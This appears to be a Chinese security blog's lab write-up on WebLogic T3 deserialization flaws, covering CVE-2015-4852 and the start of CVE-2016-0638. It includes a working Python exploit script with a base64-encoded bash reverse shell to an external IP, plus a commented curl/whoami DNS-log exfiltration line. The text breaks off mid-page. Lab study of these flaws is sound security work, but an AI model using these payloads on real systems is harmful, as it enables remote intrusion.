<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>Weblogic全漏洞学习 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="Weblogic全漏洞学习 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/04/26/Weblogic%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-04-26T14:43:52.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>April</span>
            <span>26,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">Weblogic全漏洞学习</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <p>参考：</p>
<h1 id="Weblogic基础-T3协议学习"><a href="#Weblogic基础-T3协议学习" class="headerlink" title="Weblogic基础-T3协议学习"></a>Weblogic基础-T3协议学习</h1><p>和我们学的JDBC反序列化一样,Weblogic也有类似的过程，最主要体现在反序列化的标识和一些hanshake握手包，先进行一手环境搭建</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里使用的是docker+IDEA远程调试，这种方式其实也并不是非常麻烦，用过一次后就好多了<br>首先把镜像起了,Github上有现成的环境<code>[https://github.com/QAX-A-Team/WeblogicEnvironment](https://github.com/QAX-A-Team/WeblogicEnvironment)</code><br>这里没有给你JDK环境，所以你得自己去搞一下<br>JDK安装包下载<br><code>[https://www.oracle.com/java/technologies/downloads/archive/](https://www.oracle.com/java/technologies/downloads/archive/)</code><br>Weblogic安装包下载地址：<br>下载generic<br><a target="_blank" rel="noopener" href="https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html">https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html</a><br>进去后先build一层镜</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build --build-arg JDK_PKG=jdk-8u202-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk8u202 .</span><br></pre></td></tr></table></figure>
<p>然后再run起来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p <span class="number">7001</span>:<span class="number">7001</span> -p <span class="number">8453</span>:<span class="number">8453</span> -p <span class="number">5556</span>:<span class="number">5556</span> --name weblogic1036jdk8u202 weblogic1036jdk8u202</span><br></pre></td></tr></table></figure>
<p>这里是不可以直接run起来的，因为有些BUG，它的dockerfile没有写好，所以需要加上这一条：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RUN cd /etc/yum.repos.d/</span><br><span class="line">RUN sed -i &#x27;s/mirrorlist/#mirrorlist/g&#x27; /etc/yum.repos.d/CentOS-*</span><br><span class="line">RUN sed -i &#x27;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&#x27; /etc/yum.repos.d/CentOS-*</span><br></pre></td></tr></table></figure>
<p>访问<code>[http://localhost:7001/console/login/LoginForm.jsp](http://localhost:7001/console/login/LoginForm.jsp)</code>,出现如下登录界面<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680939680509-afc86d17-09c1-4f76-8d79-d6758cb7e798.png#averageHue=%237fa7bf&clientId=uc16eb761-a3b9-4&from=paste&height=830&id=u9dfa2f73&originHeight=1037&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=257247&status=done&style=none&taskId=u63f0e29f-34ce-45ae-84a0-71e3d70cd13&title=&width=1536" alt="image.png"></p>
<h2 id="T3协议概述"><a href="#T3协议概述" class="headerlink" title="T3协议概述"></a>T3协议概述</h2><p>RMI通信传输反序列化数据，接收数据后进行反序列化，正常RMI通信使用的是JRMP协议，而在Weblogic的RMI通信中使用的是T3协议。T3协议是Weblogic独有的一个协议，相比于JRMP协议多了一些特性。以下是T3协议的特点：</p>
<ol>
<li>服务端可以持续追踪监控客户端是否存活（心跳机制），通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。</li>
<li>通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。</li>
</ol>
<h2 id="T3协议结构"><a href="#T3协议结构" class="headerlink" title="T3协议结构"></a>T3协议结构</h2><p>请求包头：<br>请求头的数据如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t3 12.2.1 AS:255 HL:19 MS:10000000 PU:t3://us-l-breens:7001</span><br></pre></td></tr></table></figure>
<p>我们用python写一个脚本发送请求头给服务器，用wireshark抓包看看会是什么</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T3Test</span>(<span class="params">ip,port</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip, port))</span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span> <span class="comment">#请求包的头</span></span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="built_in">print</span>(data.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ip = <span class="string">&quot;localhost&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line"></span><br><span class="line">    T3Test(ip,port)</span><br></pre></td></tr></table></figure>
<p>选择本地回环进行抓取<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680950831727-e1912b68-9be9-4f79-966d-5634982095e5.png#averageHue=%23f6f3f2&clientId=u1c9dc679-7a9c-4&from=paste&height=406&id=u647ee7eb&originHeight=508&originWidth=1493&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=53650&status=done&style=none&taskId=ubda367de-67d6-4b6b-82a8-221c5c4dd66&title=&width=1194.4" alt="image.png"><br>可以发现webloigc返回给我们的报文，里面包括了一些版本信息，这里有2张图可以较好的描述一下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680950916588-ebd1a89c-64be-47e2-a07d-a1d76feac49e.png#averageHue=%23a4c58d&clientId=u1c9dc679-7a9c-4&from=paste&id=u738cdc40&originHeight=163&originWidth=942&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=115379&status=done&style=none&taskId=u0dd3fef7-bcdb-432c-8c43-fa457cb4aff&title=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680950924051-e2b79174-de99-482c-b00c-26fd858c80d2.png#averageHue=%23edf2c7&clientId=u1c9dc679-7a9c-4&from=paste&id=u2277f689&originHeight=1931&originWidth=629&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=3345592&status=done&style=none&taskId=ueb9c37f9-b9bc-419b-8306-c9e3462ecb0&title=" alt="image.png"><br>第二到第七部分内容，开头都是ac ed 00 05，说明这些都是序列化的数据。只要把其中一部分替换成我们的序列化数据就可以了，有两种替换方式</p>
<ol>
<li>将weblogic发送的JAVA序列化数据的第二到九部分的JAVA序列化数据的任意一个替换为恶意的序列化数据。</li>
<li>将weblogic发送的JAVA序列化数据的第一部分与恶意的序列化数据进行拼接。</li>
</ol>
<p>以上分析来自于@sp4z师傅，个人感觉说的比较好，确实有2种替换方式，因为2-7部分全是序列化部分，并且最终会在服务端反序列化的</p>
<h1 id="CVE-2015-4852（T3-反序列化漏洞"><a href="#CVE-2015-4852（T3-反序列化漏洞" class="headerlink" title="CVE-2015-4852（T3 反序列化漏洞)"></a>CVE-2015-4852（T3 反序列化漏洞)</h1><h2 id="简单复现"><a href="#简单复现" class="headerlink" title="简单复现"></a>简单复现</h2><p>准备好我们上述的Weblogic1036，搭建起来后用如下脚本进行攻击</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload1</span>(<span class="params">gadget, command</span>):</span><br><span class="line">    JAR_FILE = <span class="string">&#x27;ysoserial.jar&#x27;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, JAR_FILE, gadget, command], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload2</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">host, port, payload</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span>.encode()</span><br><span class="line">    sock.sendall(handshake)</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;HELO:(.*).false&quot;</span>)</span><br><span class="line">    version = re.findall(pattern, data.decode())</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(version) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Weblogic &#123;&#125;&quot;</span>.<span class="built_in">format</span>(version[<span class="number">0</span>]))</span><br><span class="line">    data_len = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>) <span class="comment">#数据包长度，先占位，后面会根据实际情况重新</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>) <span class="comment">#t3协议头</span></span><br><span class="line">    flag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>) <span class="comment">#反序列化数据标志</span></span><br><span class="line">    payload = data_len + t3header + flag + payload</span><br><span class="line">    payload = struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:] <span class="comment">#重新计算数据包长度</span></span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host = <span class="string">&quot;localhost&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">&quot;CommonsCollections6&quot;</span> <span class="comment">#CommonsCollections1 Jdk7u21</span></span><br><span class="line">    command = <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTQuMTE2LjExOS4yNTMvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line">    <span class="comment"># command = &quot;curl http://`whoami`.5dhwnx.dnslog.cn&quot;</span></span><br><span class="line"></span><br><span class="line">    payload = get_payload1(gadget, command)</span><br><span class="line">    exp(host, port, payload)</span><br></pre></td></tr></table></figure>
<p>将ysoseiral放在脚本相同目录,然后运行即可收到反弹shell<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680957112100-d1ad21d6-9708-49b3-86e8-2117b6688948.png#averageHue=%23151311&clientId=u1ea083eb-5723-4&from=paste&height=128&id=u983eb839&originHeight=160&originWidth=889&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15884&status=done&style=none&taskId=ued00c83d-b5c1-4649-9bfa-386eeed57bd&title=&width=711.2" alt="image.png"></p>
<h2 id="序列化内容分析"><a href="#序列化内容分析" class="headerlink" title="序列化内容分析"></a>序列化内容分析</h2><p>一开始我们分析了一下请求头和响应包，那我们现在来看看<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680959257712-17361e4d-d51b-4db4-b603-10d195f34596.png#averageHue=%23faf4f3&clientId=u1ea083eb-5723-4&from=paste&height=760&id=uee44ce9f&originHeight=950&originWidth=1278&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=69592&status=done&style=none&taskId=ua173e1c6-09f0-4b15-810e-e9a626e35f9&title=&width=1022.4" alt="image.png"><br>还是跟刚刚一样抓包，可以看到我们已经将第三个数据包换成了ysoserial的恶意paylaod，然后关于这个数据包分为四个组成部分</p>
<ol>
<li>数据包长度</li>
<li>T3协议头</li>
<li>反序列化标志：T3协议中每个反序列化数据包前面都带有fe 01 00 00，再加上反序列化标志ac ed 00 05就变成了fe 01 00 00 ac ed 00 05</li>
<li>数据</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680959422968-1a41edd8-e5af-4bb8-b16b-5a1128632907.png#averageHue=%23f6f3f0&clientId=u1ea083eb-5723-4&from=paste&id=ua6cda907&originHeight=450&originWidth=882&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=80432&status=done&style=none&taskId=ufca5e22e-6bab-436a-a8e0-59b665d3de0&title=" alt="image.png"><br>长度就是数据包的长度，然后T3协议头和上面说到的请求包头不是一个东西，这个协议头是固定的，在payload中注释提到了</p>
<h2 id="远程调试准备"><a href="#远程调试准备" class="headerlink" title="远程调试准备"></a>远程调试准备</h2><p>分析完内容之后就该调试了<br>在分析之前需要做好远程调试的准备，我们在build的时候开放的是8453端口，因此调试的时候选这个端口即可<br>首先把需要的lib导出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\22927&gt;  docker cp weblogic1036jdk8u202:/u01/app/oracle/middleware/modules E:\CTFLearning\WeblogicEnvironment-master</span><br><span class="line"></span><br><span class="line">C:\Users\22927&gt;  docker cp weblogic1036jdk8u202:/u01/app/oracle/middleware/wlserver E:\CTFLearning\WeblogicEnvironment-master</span><br><span class="line"></span><br><span class="line">C:\Users\22927&gt;  docker cp weblogic1036jdk8u202:/u01/app/oracle/middleware/coherence_3.7/lib E:\CTFLearning\WeblogicEnvironment-master</span><br></pre></td></tr></table></figure>
<p>在调试之前你需要源码内容，打开IDEA，随便创建一个maven项目，将上面的东西都当成依赖导入，然后加一个远程JVM DEBUG服务，开始调试，端口为8453<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680960683218-e73ae98b-3818-411f-a868-293d8a0f9cbf.png#averageHue=%232d2f33&clientId=u1ea083eb-5723-4&from=paste&height=538&id=uf4f34c2d&originHeight=673&originWidth=1350&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=149389&status=done&style=none&taskId=udd84c77c-3f0e-4403-87ba-48e8fee587a&title=&width=1080" alt="image.png"></p>
<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>漏洞点处于<code>InboundMsgAbbrev#readObject</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680960721135-16b1e0e6-e0ab-4a47-b649-8d6b0c32521b.png#averageHue=%232d2f2d&clientId=u1ea083eb-5723-4&from=paste&height=775&id=u6c33c95d&originHeight=969&originWidth=1885&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2497992&status=done&style=none&taskId=ubdbe3db1-80fe-46f8-a8ae-1a4a8f5c119&title=&width=1508" alt="image.png"><br>调用了内部类<code>ServerChannelInputStream</code>的readObject方法，该类继承ObjectInputstream<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680960899071-70ab2447-0f85-4d9d-946c-9f8f3df2f9f9.png#averageHue=%232f2f2a&clientId=u1ea083eb-5723-4&from=paste&height=159&id=ude0c59f2&originHeight=199&originWidth=1264&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=359810&status=done&style=none&taskId=ud45358a6-d212-435a-ba7d-ad62fa662ad&title=&width=1011.2" alt="image.png"><br>并且有自己的resolveclass方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680961466475-411b3600-09df-4665-86f0-02b86153d435.png#averageHue=%232a2b27&clientId=u1ea083eb-5723-4&from=paste&height=381&id=u61d4f848&originHeight=476&originWidth=1261&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=857436&status=done&style=none&taskId=u285d0727-213e-4dd2-ab74-d6af511ca9c&title=&width=1008.8" alt="image.png"><br>因此最终进入的会是这里，但是在走入这一步之前还有一些步骤，可以看到调用的是父类也就是ObjectInputstream方法的resolveclass，并且自身的resolveclass没有任何防护，所以就会造成反序列化攻击漏洞<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680961534876-7eaf7d68-581d-4fc6-8b81-01d439e30c53.png#averageHue=%232d2e2b&clientId=u1ea083eb-5723-4&from=paste&height=682&id=u33c0f3c4&originHeight=853&originWidth=1747&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2154212&status=done&style=none&taskId=u2979b5f4-ca52-4f55-ba74-b330532c93f&title=&width=1397.6" alt="image.png"><br>首先是ObjectInputstream#readObject<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680961557996-feb8b20a-5b86-47be-8a1e-eb80df00273c.png#averageHue=%232b2d2b&clientId=u1ea083eb-5723-4&from=paste&height=456&id=ubb3fc752&originHeight=570&originWidth=1851&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1509189&status=done&style=none&taskId=u0637790d-5ee6-4808-b23f-c4ab2afe755&title=&width=1480.8" alt="image.png"><br>然后是readObject0,<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680961578301-d527864b-7fed-4ed6-abae-bf57049a0404.png#averageHue=%232b2d2b&clientId=u1ea083eb-5723-4&from=paste&height=639&id=ub565a3e7&originHeight=799&originWidth=1907&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2143375&status=done&style=none&taskId=u600c0ac2-8a3e-4289-93a2-7542a8f7e50&title=&width=1525.6" alt="image.png"><br>readOrdinaryObject，并且从下方变量可以看到payload里面的Hashset<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680961694694-d9687277-68a3-4e30-a36e-1289515809b1.png#averageHue=%232b2c2a&clientId=u1ea083eb-5723-4&from=paste&height=621&id=uc1b7fd79&originHeight=776&originWidth=1838&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2053049&status=done&style=none&taskId=u1376eed3-6ca6-47ab-af11-2c273ce885a&title=&width=1470.4" alt="image.png"><br>ReadClassDesc方法，然后可以看到红框中有2个分支，分别是proxy和noneproxy，这里用的是CC6，因此没有proxy代理，因此进入下面分支<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680961747013-39cfcf44-1a10-4e49-9356-5f951d0260f1.png#averageHue=%232c2e2c&clientId=u1ea083eb-5723-4&from=paste&height=713&id=ud8e5c79f&originHeight=891&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2384506&status=done&style=none&taskId=u5de38ed4-a2f1-4266-8c2d-6db5c878113&title=&width=1534.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680961754084-362676eb-90f0-47c9-a463-e8a075e81090.png#averageHue=%232c2d2b&clientId=u1ea083eb-5723-4&from=paste&height=675&id=uf4f01ac8&originHeight=844&originWidth=1897&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2241230&status=done&style=none&taskId=u5fd379a4-0af3-421c-8302-40435caeb4d&title=&width=1517.6" alt="image.png"><br>回到最初的resolveclass进行后续处理，随之就是命令执行了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680961785058-d0928a12-55dc-4676-8f86-da248836ba08.png#averageHue=%232e322c&clientId=u1ea083eb-5723-4&from=paste&height=529&id=u6196c6c4&originHeight=661&originWidth=1904&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1739163&status=done&style=none&taskId=u03c861ba-5017-4a69-a3ee-917e49ae5cd&title=&width=1523.2" alt="image.png"><br>因为没有给重写的resolveclass方法加上黑名单，所以我们可以使用恶意payload进行攻击，并且webloigc是自带低版本的CC依赖包的：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680961831240-ec4cb1ad-c318-49f9-baca-4d5d63e29ba1.png#averageHue=%23fefdfc&clientId=u1ea083eb-5723-4&from=paste&height=76&id=u0210d4a3&originHeight=95&originWidth=1019&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10269&status=done&style=none&taskId=u715efb71-91fd-4e11-9451-6ff19c96c9d&title=&width=815.2" alt="image.png"><br>因此攻击思路就成立了，最后从网上扒下来一张流程图<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680961866293-f6a49d47-65ad-4e05-9550-5d15984557d0.png#averageHue=%23f7f6f6&clientId=u1ea083eb-5723-4&from=paste&id=u9c6f955d&originHeight=564&originWidth=801&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=116281&status=done&style=none&taskId=ueca6a586-036b-4dd0-920c-5a57a789b7a&title=" alt="image.png"></p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>修复的也很简单，就是直接在resolveclass打补丁，因为这是最方便的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680961899151-306e1828-f1ed-4fd0-acc1-0509f6887d2d.png#averageHue=%23f6f6f6&clientId=u1ea083eb-5723-4&from=paste&id=u328c8b5f&originHeight=907&originWidth=1257&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=325999&status=done&style=none&taskId=u7abfb630-7d4f-48ab-b626-98e9b35b8f3&title=" alt="image.png"><br>虽然方便，但是双向来看，攻击者也更方便知道如何绕过了，既然你ban了黑名单，我们就可以进行bypass，因此也就有了接下来后续的漏洞</p>
<h1 id="CVE-2016-0638（CVE-2015-4852-修复后的绕过）"><a href="#CVE-2016-0638（CVE-2015-4852-修复后的绕过）" class="headerlink" title="CVE-2016-0638（CVE-2015-4852 修复后的绕过）"></a>CVE-2016-0638（CVE-2015-4852 修复后的绕过）</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Weblogic1036、JDK8U202</p>
<h2 id="漏洞概况"><a href="#漏洞概况" class="headerlink" title="漏洞概况"></a>漏洞概况</h2><p>前提知识：在Weblogic从流量中的序列化类字节段通过readClassDesc-readNonProxyDesc-resolveClass获取到普通类序列化数据的类对象后，程序依次尝试调用类对象中的readObject、readResolve、readExternal等方法</p>
<p>和上面说的一样，补丁设置了一些黑名单，现在我们需要做的事情就是找到别的类中是否有可以利用的readObject进行二次反序列化，这样就可以绕过了，并且注意我	们前提知识里的话，会依次调用readObject、readResolve、readExternal。这样的话思维不就更开阔了，我们可以找一个类里面有这三个里面任选一个的方法，三选一可能性加大</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在这里大佬们是找到了<code>weblogic.jms.common.StreamMessageImpl </code><br>这B类我在1036版本怎么找都是找不到，我猜是在补丁里，但这补丁又要钱网上下不到，所以偷个懒QWQ<br>这个类不在黑名单中，因此可以进行反序列化，我们看看这个类的结构<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680963894009-0faf839d-5c78-4d86-b1a0-61172ecf3b2e.png#averageHue=%232d2c2c&clientId=u1ea083eb-5723-4&from=paste&id=u7e4eb00b&originHeight=438&originWidth=1282&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=104335&status=done&style=none&taskId=ub4a91623-cdb2-4617-9409-6cf2dac4ca9&title=" alt="image.png"><br>这个类中的readExternal方法里面最终调用了readObject，因此最终造成了二次反序列化，var4的由来如下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680965006105-6addea5f-1b21-4f5f-9fe7-6f22416d27ed.png#averageHue=%232d2c2b&clientId=u1ea083eb-5723-4&from=paste&id=ud028b4cb&originHeight=462&originWidth=1432&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=111813&status=done&style=none&taskId=ude8cc39a-be37-4dd5-83f3-96b36664f86&title=" alt="image.png"><br><img 